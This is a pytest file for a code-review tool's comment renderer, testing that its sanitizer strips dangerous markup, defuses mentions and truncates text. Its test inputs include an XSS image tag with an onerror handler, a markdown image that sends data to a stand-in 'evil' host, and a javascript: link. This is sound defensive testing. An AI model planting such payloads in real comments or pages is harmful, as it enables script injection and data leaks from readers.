from code_reviewer.models import CriterionScore, ReviewResult, Verdict
from code_reviewer.render import MARKER, render_comment, sanitize

_CRITERIA = (
    "implementation_correctness",
    "idiomaticity",
    "complexity",
    "test_coverage",
    "security_and_safety",
    "review_integrity",
)


def _result() -> ReviewResult:
    return ReviewResult(
        **{name: CriterionScore(score=8, rationale="solid") for name in _CRITERIA},
        summary="looks good",
    )


def test_marker_is_first_line_and_exact() -> None:
    comment = render_comment(_result(), Verdict.PASS)
    assert comment.splitlines()[0] == MARKER


def test_html_tag_stripped() -> None:
    out = sanitize("hello <img src=x onerror=alert(1)> world")
    assert "<img" not in out
    assert "onerror" not in out


def test_markdown_image_neutralized() -> None:
    out = sanitize("see ![alt](http://evil/?d=leak) here")
    assert "![" not in out
    assert "http://evil" not in out
    assert "alt" in out


def test_markdown_link_neutralized() -> None:
    out = sanitize("click [text](javascript:alert(1))")
    assert "javascript:" not in out
    assert "[text]" not in out
    assert "text" in out


def test_mention_defused() -> None:
    out = sanitize("cc @maintainer please")
    assert "@maintainer" not in out
    assert "@​maintainer" in out


def test_overlong_text_truncated() -> None:
    out = sanitize("x" * 1000, max_length=100)
    assert len(out) == 100
    assert out.endswith("…")


def test_error_body_has_no_score_table() -> None:
    comment = render_comment(None, Verdict.ERROR)
    assert comment.splitlines()[0] == MARKER
    assert "|" not in comment


def test_skipped_body_has_no_score_table() -> None:
    comment = render_comment(None, Verdict.SKIPPED)
    assert comment.splitlines()[0] == MARKER
    assert "|" not in comment
